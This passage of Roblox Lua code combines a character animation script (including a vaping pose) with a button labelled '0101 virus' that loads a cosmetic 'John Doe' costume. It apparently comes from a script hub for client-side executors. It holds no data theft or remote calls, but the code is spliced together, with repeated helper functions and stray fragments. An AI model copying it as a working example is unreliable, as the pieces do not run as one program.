rootJoint = rootPart:findFirstChild("RootJoint")
rootJoint.Archivable = true
c_new = CFrame.new
i_new = Instance.new
c_angles = CFrame.Angles
Humanoid:ClearAllChildren()
local Animations = false
local followMouse = false
local isSprinting = false
local Angle = 0
local angleSpeed = 1
local currentAnim
local Vaping = false
local vapePower = 2.5
local Release = false
local currentFace = Head.face.Texture
function math_pos(float)
  if float < 0 then
    float = 0
  end
  return float
end
function math_neg(float)
  if float > 0 then
    float = 0
  end
  return float
end
function math_max(float, max)
  if max < float then
    float = max
  end
  return float
end
function math_min(float, min)
  if min < float then
    float = min
  end
  return float
end
function newWeld(wp0, wp1, wc0x, wc0y, wc0z)
  wld = Instance.new("Weld", wp1)
  wld.Part0 = wp0
  wld.Part1 = wp1
  wld.C0 = CFrame.new(wc0x, wc0y, wc0z)
  return wld
end
function newWeld2(wp02, wp12, wc0x2, wc0y2, wc0z2, wc0x12, wc0y12, wc0z12)
  wld2 = Instance.new("Weld", wp12)
  wld2.Part0 = wp02
  wld2.Part1 = wp12
  wld2.C0 = CFrame.new(wc0x2, wc0y2, wc0z2) * CFrame.Angles(wc0x12, wc0y12, wc0z12)
  return wld2
end
LA_Weld = newWeld(Torso, Left_Arm, -1.5, 0.5, 0)
Left_Arm.Weld.C1 = CFrame.new(0, 0.5, 0)
RA_Weld = newWeld(Torso, Right_Arm, 1.5, 0.5, 0)
Right_Arm.Weld.C1 = CFrame.new(0, 0.5, 0)
LL_Weld = newWeld(Torso, Left_Leg, -0.5, -1, 0)
Left_Leg.Weld.C1 = CFrame.new(0, 1, 0)
RL_Weld = newWeld(Torso, Right_Leg, 0.5, -1, 0)
Right_Leg.Weld.C1 = CFrame.new(0, 1, 0)
Torso_Weld = newWeld(rootPart, Torso, 0, -1, 0)
Torso.Weld.C1 = CFrame.new(0, -1, 0)
Head_Weld = newWeld(Torso, Head, 0, 1.5, 0)
function nooutline(part)
  part.TopSurface, part.BottomSurface, part.LeftSurface, part.RightSurface, part.FrontSurface, part.BackSurface = 10, 10, 10, 10, 10, 10
end
function part(formfactor, parent, material, reflectance, transparency, brickcolor, name, size)
  local fp = i_new("Part")
  fp.formFactor = formfactor
  fp.Parent = parent
  fp.Reflectance = reflectance
  fp.Transparency = transparency
  fp.CanCollide = false
  fp.Locked = true
  fp.BrickColor = BrickColor.new(tostring(brickcolor))
  fp.Name = name
  fp.Size = size
  fp.Position = Character.Torso.Position
  nooutline(fp)
  fp.Material = material
  fp:BreakJoints()
  return fp
end
function mesh(Mesh, part, meshtype, meshid, offset, scale)
  local mesh = i_new(Mesh)
  mesh.Parent = part
  if Mesh == "SpecialMesh" then
    mesh.MeshType = meshtype
    mesh.MeshId = meshid
  end
  mesh.Offset = offset
  mesh.Scale = scale
  return mesh
end
function weld(parent, part0, part1, c0, c1)
  local weld = i_new("Weld")
  weld.Parent = parent
  weld.Part0 = part0
  weld.Part1 = part1
  weld.C0 = c0
  weld.C1 = c1
  return weld
end
function swait(num)
  if num == 0 or num == nil then
    game:GetService("RunService").Stepped:wait(0)
  else
    for i = 0, num do
      game:GetService("RunService").Stepped:wait(0)
    end
  end
end
function newRay(start, face, range, wat)
  local ray = Ray.new(start.p, (face.p - start.p).Unit * range)
  hit, pos = workspace:findPartOnRayWithIgnoreList(ray, wat)
  return ray, hit, pos
end
function QuaternionFromCFrame(cf)
  local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
  local trace = m00 + m11 + m22
  if trace > 0 then
    local s = math.sqrt(1 + trace)
    local recip = 0.5 / s
    return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
  else
    local i = 0
    if m00 < m11 then
      i = 1
    end
    if m22 > (i == 0 and m00 or m11) then
      i = 2
    end
    if i == 0 then
      local s = math.sqrt(m00 - m11 - m22 + 1)
      local recip = 0.5 / s
      return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
    elseif i == 1 then
      local s = math.sqrt(m11 - m22 - m00 + 1)
      local recip = 0.5 / s
      return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
    elseif i == 2 then
      local s = math.sqrt(m22 - m00 - m11 + 1)
      local recip = 0.5 / s
      return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
    end
  end
end
function QuaternionToCFrame(px, py, pz, x, y, z, w)
  local xs, ys, zs = x + x, y + y, z + z
  local wx, wy, wz = w * xs, w * ys, w * zs
  local xx = x * xs
  local xy = x * ys
  local xz = x * zs
  local yy = y * ys
  local yz = y * zs
  local zz = z * zs
  return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))
end
function QuaternionSlerp(a, b, t)
  local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
  local startInterp, finishInterp
  if cosTheta >= 1.0E-4 then
    if 1 - cosTheta > 1.0E-4 then
      local theta = math.acos(cosTheta)
      local invSinTheta = 1 / math.sin(theta)
      startInterp = math.sin((1 - t) * theta) * invSinTheta
      finishInterp = math.sin(t * theta) * invSinTheta
    else
      startInterp = 1 - t
      finishInterp = t
    end
  elseif 1 + cosTheta > 1.0E-4 then
    local theta = math.acos(-cosTheta)
    local invSinTheta = 1 / math.sin(theta)
    startInterp = math.sin((t - 1) * theta) * invSinTheta
    finishInterp = math.sin(t * theta) * invSinTheta
  else
    startInterp = t - 1
    finishInterp = t
  end
  return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
end
function clerp(a, b, t)
  local qa = {
    QuaternionFromCFrame(a)
  }
  local qb = {
    QuaternionFromCFrame(b)
  }
  local ax, ay, az = a.x, a.y, a.z
  local bx, by, bz = b.x, b.y, b.z
  local _t = 1 - t
  return QuaternionToCFrame(_t * ax + t * bx, _t * ay + t * by, _t * az + t * bz, QuaternionSlerp(qa, qb, t))
end
local freeFalling = false
Humanoid.FreeFalling:connect(function(f)
  if f then
    freeFalling = true
  else
    freeFalling = false
  end
end)
function Vapor()
end
function Vape()
  if Release == true and vapePower > 5 then
    Vaping = true
    Humanoid.WalkSpeed = 0
    Humanoid.JumpPower = 0
    z2 = Instance.new("Sound", char)
    z2.SoundId = "rbxassetid://179697562"
    z2.Looped = false
    z2.Pitch = 0.72
    z2.Volume = 5
    for i = 0, 3, 0.01 do
      Animations = true
      RA_Weld.C0 = clerp(RA_Weld.C0, c_new(1.5, 0.5, 0.1) * c_angles(math.rad(20), math.rad(0), math.rad(20)), 0.01)
      LA_Weld.C0 = clerp(LA_Weld.C0, c_new(-1.5, 0.5, 0.1) * c_angles(math.rad(20), math.rad(0), math.rad(-20)), 0.01)
      LL_Weld.C0 = clerp(LL_Weld.C0, c_new(-0.5, -1, 0) * c_angles(math.rad(0), math.rad(0), math.rad(-5.5)), 0.005)
      RL_Weld.C0 = clerp(RL_Weld.C0, c_new(0.5, -1, 0) * c_angles(math.rad(0), math.rad(0), math.rad(5.5)), 0.005)
      Torso_Weld.C0 = clerp(Torso_Weld.C0, c_new(0, -1, 0) * c_angles(math.rad(0), math.rad(0), 0), 0.01)
      Head_Weld.C0 = clerp(Head_Weld.C0, c_new(0, 1.5, 0) * c_angles(math.rad(-5), math.rad(0), 0), 0.005)
      Head.face.Texture = "http://www.roblox.com/asset/?id=7317691"
      swait()
    end
    z2:Play()
    z = Instance.new("Sound", char)
    z.SoundId = "rbxassetid://394983740"
    z.Looped = false
    z.Pitch = 0.72
    z.Volume = 10
    wait(0.1)
    z:Play()
    wait(7.5)
    Head.face.Texture = currentFace
    Humanoid.WalkSpeed = 16
    Humanoid.JumpPower = 50
    Animations = false
    wait(1)
    Vaping = false
    vapePower = 2.5
  elseif vapePower < 5 then
    Vaping = false
    vapePower = 2.5
  end
end
Mouse.KeyDown:connect(function(key)
  if key == "z" and followMouse == false then
    followMouse = true
    gyro = Instance.new("BodyGyro", rootPart)
    gyro.P = 10000000
    gyro.D = 1000
    gyro.MaxTorque = Vector3.new(0, 10000000, 0)
    coroutine.resume(coroutine.create(function()
      while wait() do
        gyro.CFrame = CFrame.new(Vector3.new(), (Mouse.Hit.p - rootPart.CFrame.p).unit * 100)
      end
    end))
  elseif key == "z" and followMouse == true then
    followMouse = false
    gyro:Destroy()
  end
end)
Mouse.Button1Down:connect(function()
  if Vaping == false then
    Vaping = true
    Release = false
    Mouse.Button1Up:connect(function()
      Release = true
    end)
    if Release == false then
      repeat
        Animations = true
        vapePower = vapePower + 0.1
        Humanoid.WalkSpeed = 0
        Humanoid.JumpPower = 0
        wait()
        RA_Weld.C0 = clerp(RA_Weld.C0, c_new(1.8, 1.4, -1) * c_angles(math.rad(60), math.rad(-25), math.rad(-80)) * CFrame.Angles(0, math.rad(150), 0), 0.1)
        LA_Weld.C0 = clerp(LA_Weld.C0, c_new(-1.5, 0.5, 0.1) * c_angles(math.rad(-12.5), math.rad(10), math.rad(-25)), 0.1)
        LL_Weld.C0 = clerp(LL_Weld.C0, c_new(-0.5, -1, 0) * c_angles(math.rad(-15), math.rad(0), math.rad(-5)), 0.01)
        RL_Weld.C0 = clerp(RL_Weld.C0, c_new(0.5, -1, 0) * c_angles(math.rad(-15), math.rad(0), math.rad(5)), 0.01)
        Head_Weld.C0 = clerp(Head_Weld.C0, c_new(0, 1.5, -0.05) * c_angles(math.rad(11.5), math.rad(0), 0), 0.05)
        Torso_Weld.C0 = clerp(Torso_Weld.C0, c_new(0, -1, 0) * c_angles(math.rad(15), math.rad(0), 0), 0.01)
        if vapePower > 5 then
          Head.face.Texture = "http://www.roblox.com/asset/?id=7317691"
        elseif vapePower < 5 then
          Humanoid.WalkSpeed = 16
          Humanoid.JumpPower = 50
        end
        print(vapePower)
      until Release == true
    end
    Animations = false
    Vape()
  end
end)
Vepr = Instance.new("Model", Character)
Handle = part(Enum.FormFactor.Symmetric, Vepr, Enum.Material.Metal, 1, 0, "Royal purple", "Handle", Vector3.new(0.200000003, 0.800000012, 0.200000003))
Handleweld = weld(Vepr, Right_Arm, Handle, CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), CFrame.new(0.677656174, -0.199986219, -0.745416641, 0.721854568, 0.692044795, -4.12490877E-8, 0, 5.96046377E-8, 1, 0.692044854, -0.721854508, 4.30258851E-8))
Player = game:GetService("Players").LocalPlayer
Character = Player.Character
Mouse = Player:GetMouse()
m = Instance.new("Model", Character)
local weldBetween = function(a, b)
  local weldd = Instance.new("ManualWeld")
  weldd.Part0 = a
  weldd.Part1 = b
  weldd.C0 = CFrame.new()
  weldd.C1 = b.CFrame:inverse() * a.CFrame
  weldd.Parent = a
  return weldd
end
it = Instance.new
function nooutline(part)
  part.TopSurface, part.BottomSurface, part.LeftSurface, part.RightSurface, part.FrontSurface, part.BackSurface = 10, 10, 10, 10, 10, 10
end
function part(formfactor, parent, material, reflectance, transparency, brickcolor, name, size)
  local fp = it("Part")
  fp.formFactor = formfactor
  fp.Parent = parent
  fp.Reflectance = reflectance
  fp.Transparency = transparency
  fp.CanCollide = false
  fp.Locked = true
  fp.BrickColor = BrickColor.new(tostring(brickcolor))
  fp.Name = name
  fp.Size = size
  fp.Position = Character.Torso.Position
  nooutline(fp)
  fp.Material = material
  fp:BreakJoints()
  return fp
end
function mesh(Mesh, part, meshtype, meshid, offset, scale)
  local mesh = it(Mesh)
  mesh.Parent = part
  if Mesh == "SpecialMesh" then
    mesh.MeshType = meshtype
    mesh.MeshId = meshid
  end
  mesh.Offset = offset
  mesh.Scale = scale
  return mesh
end
function weld(parent, part0, part1, c0, c1)
  local weld = it("Weld")
  weld.Parent = parent
  weld.Part0 = part0
  weld.Part1 = part1
  weld.C0 = c0
  weld.C1 = c1
  return weld
end
BottleR = part(Enum.FormFactor.Plate, m, Enum.Material.Neon, 0, 0, "Royal purple", "Handle", Vector3.new(1.44916654, 1.73900044, 1.44916654))
BottleRweld = weld(m, Character["Right Arm"], BottleR, CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), CFrame.new(-0.150012493, 1.13759422, -1.12566471, -1, 0, 0, 0, 0.146834984, -0.989161015, 0, -0.989160895, -0.146834999))
mesh("SpecialMesh", BottleR, Enum.MeshType.FileMesh, "http://www.roblox.com/asset/?id=11409474", Vector3.new(0, 0, 0), Vector3.new(2.17374969, 3.62291789, 2.17374969))
Player = game:GetService("Players").LocalPlayer
Character = Player.Character
Mouse = Player:GetMouse()
m = Instance.new("Model", Character)
local weldBetween = function(a, b)
  local weldd = Instance.new("ManualWeld")
  weldd.Part0 = a
  weldd.Part1 = b
  weldd.C0 = CFrame.new()
  weldd.C1 = b.CFrame:inverse() * a.CFrame
  weldd.Parent = a
  return weldd
end
it = Instance.new
function nooutline(part)
  part.TopSurface, part.BottomSurface, part.LeftSurface, part.RightSurface, part.FrontSurface, part.BackSurface = 10, 10, 10, 10, 10, 10
end
function part(formfactor, parent, material, reflectance, transparency, brickcolor, name, size)
  local fp = it("Part")
  fp.formFactor = formfactor
  fp.Parent = parent
  fp.Reflectance = reflectance
  fp.Transparency = transparency
  fp.CanCollide = false
  fp.Locked = true
  fp.BrickColor = BrickColor.new(tostring(brickcolor))
  fp.Name = name
  fp.Size = size
  fp.Position = Character.Torso.Position
  nooutline(fp)
  fp.Material = material
  fp:BreakJoints()
  return fp
end
function mesh(Mesh, part, meshtype, meshid, offset, scale)
  local mesh = it(Mesh)
  mesh.Parent = part
  if Mesh == "SpecialMesh" then
    mesh.MeshType = meshtype
    mesh.MeshId = meshid
  end
  mesh.Offset = offset
  mesh.Scale = scale
  return mesh
end
function weld(parent, part0, part1, c0, c1)
  local weld = it("Weld")
  weld.Parent = parent
  weld.Part0 = part0
  weld.Part1 = part1
  weld.C0 = c0
  weld.C1 = c1
  return weld
end
BottleL = part(Enum.FormFactor.Plate, m, Enum.Material.Neon, 0, 0, "Royal purple", "Handle", Vector3.new(1.44916654, 1.73900044, 1.44916654))
BottleLweld = weld(m, Character["Left Arm"], BottleL, CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), CFrame.new(0.229987741, 1.13759422, -1.12566471, -1, 0, 0, 0, 0.146834984, -0.989161015, 0, -0.989160895, -0.146834999))
mesh("SpecialMesh", BottleL, Enum.MeshType.FileMesh, "http://www.roblox.com/asset/?id=11409474", Vector3.new(0, 0, 0), Vector3.new(2.17374969, 3.62291789, 2.17374969))
game:GetService("RunService").Stepped:connect(function()
  Angle = Angle % 100 + angleSpeed / 10
  walkingMagnitude = Vector3.new(rootPart.Velocity.X, 0, rootPart.Velocity.Z).magnitude
  jumpVel = Torso.Velocity.Y
  if Humanoid.Jump and jumpVel > 1 then
    currentAnim = "Jumping"
  elseif freeFalling == true then
    currentAnim = "Falling"
  elseif walkingMagnitude < 2 then
    currentAnim = "Idling"
  elseif isSprinting == true then
    currentAnim = "Sprinting"
  elseif walkingMagnitude > 2 then
    currentAnim = "Walking"
  end
  if currentAnim == "Jumping" and Animations == false then
    angleSpeed = 1
    axisSpeed = 1
    RA_Weld.C0 = clerp(RA_Weld.C0, c_new(1.5, 0.5, -0.1) * c_angles(math.rad(-10), math.rad(0), math.rad(10)), 0.15)
    LA_Weld.C0 = clerp(LA_Weld.C0, c_new(-1.5, 0.5, -0.1) * c_angles(math.rad(-10), math.rad(0), math.rad(-10)), 0.15)
    LL_Weld.C0 = clerp(LL_Weld.C0, c_new(-0.5, -1, 0) * c_angles(math.rad(-10), math.rad(0), math.rad(-10)), 0.15)
    RL_Weld.C0 = clerp(RL_Weld.C0, c_new(0.5, -1, 0) * c_angles(math.rad(-10), math.rad(0), math.rad(10)), 0.15)
    Torso_Weld.C0 = clerp(Torso_Weld.C0, c_new(0, -1, 0) * c_angles(math.rad(0), math.rad(0), math.rad(0)) * c_angles(math.rad(0), math.rad(0), rootPart.RotVelocity.Y / 55), 0.4)
    Head_Weld.C0 = clerp(Head_Weld.C0, c_new(0, 1.5, 0) * c_angles(math.rad(15), math.rad(0), math.rad(0)), 0.15)
  elseif currentAnim == "Falling" and Animations == false then
    angleSpeed = 1
    axisSpeed = 1
    RA_Weld.C0 = clerp(RA_Weld.C0, c_new(1.5, 0.5, -0.1) * c_angles(math.rad(0), math.rad(0), math.rad(65)), 0.125)
    LA_Weld.C0 = clerp(LA_Weld.C0, c_new(-1.5, 0.5, -0.1) * c_angles(math.rad(0), math.rad(0), math.rad(-65)), 0.125)
    LL_Weld.C0 = clerp(LL_Weld.C0, c_new(-0.5, -0.4, -0.4) * c_angles(math.rad(-5), math.rad(0), math.rad(-2.5)), 0.125)
    RL_Weld.C0 = clerp(RL_Weld.C0, c_new(0.5, -0.4, -0.4) * c_angles(math.rad(-5), math.rad(0), math.rad(2.5)), 0.125)
    Torso_Weld.C0 = clerp(Torso_Weld.C0, c_new(0, -1, 0) * c_angles(math.rad(-20), math.rad(0), math.rad(0)), 0.05)
    Head_Weld.C0 = clerp(Head_Weld.C0, c_new(0, 1.5, 0) * c_angles(math.rad(-17.5), math.rad(0), math.rad(0)), 0.125)
  elseif currentAnim == "Idling" and Animations == false then
    angleSpeed = 0.25
    axisSpeed = 0.25
    RA_Weld.C0 = clerp(RA_Weld.C0, c_new(1.5, 0.5 + math.sin(Angle) * 0.075, 0.1) * c_angles(math.rad(15) + math.sin(Angle) * 0.075, math.rad(0), math.rad(10) + math.sin(Angle) * 0.075), 0.125)
    LA_Weld.C0 = clerp(LA_Weld.C0, c_new(-1.5, 0.5 + math.sin(Angle) * 0.075, 0.1) * c_angles(math.rad(-10) + math.sin(Angle) * 0.075, math.rad(0), math.rad(-10) - math.sin(Angle) * 0.075), 0.125)
    LL_Weld.C0 = clerp(LL_Weld.C0, c_new(-0.5, -1.1 - math.sin(Angle) * 0.075, -0.25) * c_angles(math.rad(15), math.rad(0), math.rad(-7.5)), 0.125)
    RL_Weld.C0 = clerp(RL_Weld.C0, c_new(0.5, -1.1 - math.sin(Angle) * 0.075, -0.25) * c_angles(math.rad(-15), math.rad(0), math.rad(7.5)), 0.125)
    Torso_Weld.C0 = clerp(Torso_Weld.C0, c_new(0, -1 + math.sin(Angle) * 0.075, 0) * c_angles(math.rad(-5), math.rad(0), 0), 0.3)
    Head_Weld.C0 = clerp(Head_Weld.C0, c_new(0, 1.5, -0.05) * c_angles(math.rad(-5) + math.sin(Angle) * 0.05, math.rad(0), 0), 0.125)
  elseif currentAnim == "Sprinting" and Animations == false then
    angleSpeed = 2
    axisSpeed = 2
    RA_Weld.C0 = clerp(RA_Weld.C0, c_new(1.5, 0.5, 0) * c_angles(-math.sin(Angle) * 2, math.rad(5) + math.sin(Angle) * 0.1, math.rad(5) + rootPart.RotVelocity.Y / 35), 0.15)
    RA_Weld.C1 = c_new(0, 0.5, 0)
    LA_Weld.C0 = clerp(LA_Weld.C0, c_new(-1.5, 0.5, 0) * c_angles(-math.sin(Angle) * -2, math.rad(-5) + math.sin(Angle) * 0.1, math.rad(-5) + rootPart.RotVelocity.Y / 35), 0.15)
    LA_Weld.C1 = c_new(0, 0.5, 0)
    LL_Weld.C0 = clerp(LL_Weld.C0, c_new(-0.5, -1.15 + math_pos(-math.cos(Angle - 0.25) * 0.65), math_neg(math.asin(math.sin(Angle)) * 0.65)) * c_angles(-0.025 - math.asin(math.sin(Angle)) * 1, 0, -0.025 + -math.asin(math.sin(Angle)) * 0.025 + rootPart.RotVelocity.Y / 25), 0.15)
    RL_Weld.C0 = clerp(RL_Weld.C0, c_new(0.5, -1.15 + math_pos(math.cos(Angle - 0.25) * 0.65), math_neg(-math.asin(math.sin(Angle)) * 0.65)) * c_angles(-0.025 + math.asin(math.sin(Angle)) * 1, 0, 0.025 + -math.asin(math.sin(Angle)) * 0.025 + rootPart.RotVelocity.Y / 25), 0.15)
    Torso_Weld.C0 = clerp(Torso_Weld.C0, c_new(0, -1 + math.abs(math.sin(Angle) * 0.25), 0) * c_angles(math.rad(-20) + math.abs(math.sin(Angle) * 0.05) + rootPart.RotVelocity.Y / 35, math.sin(Angle) * 0.015, rootPart.RotVelocity.Y / 55), 0.15)
    Head_Weld.C0 = clerp(Head_Weld.C0, c_new(0, 1.5, 0) * c_angles(math.abs(math.sin(Angle / 2) * 0.5 * 0.05), math.sin(Angle) * -0.05 + rootPart.RotVelocity.Y / 15, 0), 0.15)
  elseif currentAnim == "Walking" and Animations == false then
    angleSpeed = 1
    axisSpeed = 1
    Humanoid.WalkSpeed = 7
    RA_Weld.C0 = clerp(RA_Weld.C0, c_new(1.5, 0.5, 0) * c_angles(-math.sin(Angle) * 0.6, math.rad(5) + math.sin(Angle) * 0.05, math.rad(5)), 0.15)
    LA_Weld.C0 = clerp(LA_Weld.C0, c_new(-1.5, 0.5, 0) * c_angles(-math.sin(Angle) * -0.6, math.rad(-5) + math.sin(Angle) * 0.05, math.rad(-5)), 0.15)
    LL_Weld.C0 = clerp(LL_Weld.C0, c_new(-0.5, -1.05 + math_pos(-math.cos(Angle - 0.25) * 0.35), math_neg(math.asin(math.sin(Angle)) * 0.35)) * c_angles(-0.025 - math.asin(math.sin(Angle)) * 0.4, 0, -0.025 + -math.asin(math.sin(Angle)) * 0.025 - rootPart.RotVelocity.Y / 65), 0.15)
    RL_Weld.C0 = clerp(RL_Weld.C0, c_new(0.5, -1.05 + math_pos(math.cos(Angle - 0.25) * 0.35), math_neg(-math.asin(math.sin(Angle)) * 0.35)) * c_angles(-0.025 + math.asin(math.sin(Angle)) * 0.4, 0, 0.025 + -math.asin(math.sin(Angle)) * 0.025 - rootPart.RotVelocity.Y / 65), 0.15)
    Torso_Weld.C0 = clerp(Torso_Weld.C0, c_new(0, -1 + math.abs(math.sin(Angle) * 0.05), 0) * c_angles(math.rad(-12.5) + math.abs(math.sin(Angle) * 0.05), math.sin(Angle) * 0.015, rootPart.RotVelocity.Y / 55), 0.15)
    Head_Weld.C0 = clerp(Head_Weld.C0, c_new(0, 1.5, 0) * c_angles(math.abs(math.sin(Angle / 2) * 0.5 * 0.05), math.sin(Angle) * -0.05 + rootPart.RotVelocity.Y / 45, 0), 0.15)
  end
end)

  	end    

})

Tab:AddButton({

	Name = "0101病毒",

	Callback = function()

     ------------
--John Doe--
------------
-----by-----
--CKbackup--
------------

--Player Stuff--
player = game:GetService("Players").LocalPlayer
chara = player.Character

ch = chara:GetChildren()
for i = 1, #ch do
if ch[i].Name == "Torso" then
ch[i].roblox.Transparency = 1
elseif ch[i].Name == "Head" then
ch[i].face.Transparency = 1
ch[i].Transparency = 1
elseif ch[i].ClassName == "Accessory" or ch[i].ClassName == "Shirt" or ch[i].ClassName == "Pants" or ch[i].ClassName == "ShirtGraphic" then
ch[i]:Destroy()
end
end

chara["Left Arm"].BrickColor = BrickColor.new("Cool yellow")
chara["Right Arm"].BrickColor = BrickColor.new("Cool yellow")
chara["Left Leg"].BrickColor = BrickColor.new("Medium blue")
chara["Right Leg"].BrickColor = BrickColor.new("Medium blue")
chara.Torso.BrickColor = BrickColor.new("Bright yellow")

--Outfit--
New = function(Object, Parent, Name, Data)
	local Object = Instance.new(Object)
	for Index, Value in pairs(Data or {}) do
		Object[Index] = Value
	end
	Object.Parent = Parent
	Object.Name = Name
	return Object
end

function ScatterEff(part)
local eff1 = Instance.new("ParticleEmitter",part)
eff1.Size = NumberSequence.new(.1)
eff1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.9,0),NumberSequenceKeypoint.new(1,1)})
eff1.LightEmission = 1
eff1.Lifetime = NumberRange.new(1)
eff1.Speed = NumberRange.new(1)
eff1.Rate = 100
eff1.VelocitySpread = 10000
eff1.Texture = "rbxassetid://347504241"
eff1.Color = ColorSequence.new(Color3.new(1,0,0))
local eff2 = Instance.new("ParticleEmitter",part)
eff2.Size = NumberSequence.new(.1)
eff2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.9,0),NumberSequenceKeypoint.new(1,1)})
eff2.LightEmission = 1
eff2.Lifetime = NumberRange.new(1)
eff2.Speed = NumberRange.new(1)
eff2.Rate = 100
eff2.VelocitySpread = 10000
eff2.Texture = "rbxassetid://347504259"
eff2.Color = ColorSequence.new(Color3.new(1,0,0))
end

function BurningEff(part)
local eff1 = Instance.new("ParticleEmitter",part)
eff1.Size = NumberSequence.new(.1)
eff1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
eff1.LightEmission = 1
eff1.Lifetime = NumberRange.new(1)
eff1.Speed = NumberRange.new(0)
eff1.Rate = 100
eff1.Texture = "rbxassetid://347504241"
eff1.Acceleration = Vector3.new(0,10,0)
eff1.Color = ColorSequence.new(Color3.new(1,0,0))
local eff2 = Instance.new("ParticleEmitter",part)
eff2.Size = NumberSequence.new(.1)
eff2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
eff2.LightEmission = 1
eff2.Lifetime = NumberRange.new(1)
eff2.Speed = NumberRange.new(0)
eff2.Rate = 100
eff2.Texture = "rbxassetid://347504259"
eff2.Acceleration = Vector3.new(0,10,0)
eff2.Color = ColorSequence.new(Color3.new(1,0,0))
local eff3 = Instance.new("ParticleEmitter",part)
eff3.Size = NumberSequence.new(1)
eff3.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})
eff3.LightEmission = 1
eff3.Lifetime = NumberRange.new(1)
eff3.Speed = NumberRange.new(0)
eff3.Rate = 100
eff3.Texture = "rbxasset://textures/particles/fire_main.dds"
eff3.Acceleration = Vector3.new(0,10,0)
eff3.Color = ColorSequence.new(Color3.new(1,0,0))
end

FakeHead = New("Model",chara,"FakeHead",{})
MainPart = New("Part",FakeHead,"MainPart",{FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(2, 1, 1),CFrame = CFrame.new(2.29537678, 7.81603718, 0.746068954, 0.00980896503, 0.00110200304, 0.999957919, -0.000536994543, 1.00000548, -0.00109680078, -0.99994874, -0.0005262224, 0.00980964955),CanCollide = false,TopSurface = Enum.SurfaceType.Smooth,})
Mesh = New("SpecialMesh",MainPart,"Mesh",{Scale = Vector3.new(1.25, 1.25, 1.25),})
face = New("Decal",MainPart,"face",{Texture = "rbxasset://textures/face.png",})
Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara.Head,C0 = CFrame.new(0, 0, 0, 0.00980896503, -0.000536994543, -0.99994874, 0.00110200304, 1.00000548, -0.0005262224, 0.999957919, -0.00109680078, 0.00980964955),C1 = CFrame.new(5.96046448e-008, -8.58306885e-006, 0, 0.00980896503, -0.000536994543, -0.99994874, 0.00110200304, 1.00000548, -0.0005262224, 0.999957919, -0.00109680078, 0.00980964955),})
FakeHead.MainPart.BrickColor = BrickColor.new("Cool yellow")
EyeFire = New("Part",FakeHead,"EyeFire",{BrickColor = BrickColor.new("Really red"),Material = Enum.Material.Neon,Size = Vector3.new(0.400000006, 0.200000003, 0.200000003),CFrame = CFrame.new(1.69668579, 8.11665249, 0.640022159, -0.00107900088, 0.999958038, -0.00980941113, -1.0000056, -0.00107390946, 0.000525554642, 0.000515007298, 0.00981007144, 0.999948859),CanCollide = false,Color = Color3.new(1, 0, 0),})
Mesh = New("CylinderMesh",EyeFire,"Mesh",{Offset = Vector3.new(0.0500000007, 0, -0.0399999991),Scale = Vector3.new(1, 0.150000006, 1),})
Weld = New("ManualWeld",EyeFire,"Weld",{Part0 = EyeFire,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.0010790003, -0.999999344, 0.000515000196, 0.999951363, -0.0010738963, 0.00981000345, -0.00980944186, 0.000525560055, 0.99995178),C1 = CFrame.new(0.100008011, 0.300009251, -0.600027919, 0.00980899762, -0.000536999898, -0.99995178, 0.00110200245, 0.999999344, -0.000526215415, 0.999951363, -0.00109678751, 0.00980958249),})
Chest = New("Model",chara,"Chest",{})
MainPart = New("Part",Chest,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(2, 2, 1),CFrame = CFrame.new(2.2937007, 6.31611967, 0.746871948, 0.00980956201, 0.00110224239, 0.999954581, -0.000537135813, 1.00000238, -0.00109703222, -0.99995023, -0.000526354474, 0.00981019717),CanCollide = false,LeftSurface = Enum.SurfaceType.Weld,RightSurface = Enum.SurfaceType.Weld,})
Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara.Torso,C0 = CFrame.new(0, 0, 0, 0.009809535, -0.000537137908, -0.99994725, 0.00110225554, 1.00000858, -0.000526368851, 0.999961257, -0.00109705783, 0.00981026888),C1 = CFrame.new(5.96046448e-008, -9.05990601e-006, -2.38418579e-007, 0.00980956666, -0.000537143264, -0.99995023, 0.00110225484, 1.00000238, -0.000526361808, 0.999954581, -0.00109704456, 0.00981020182),})
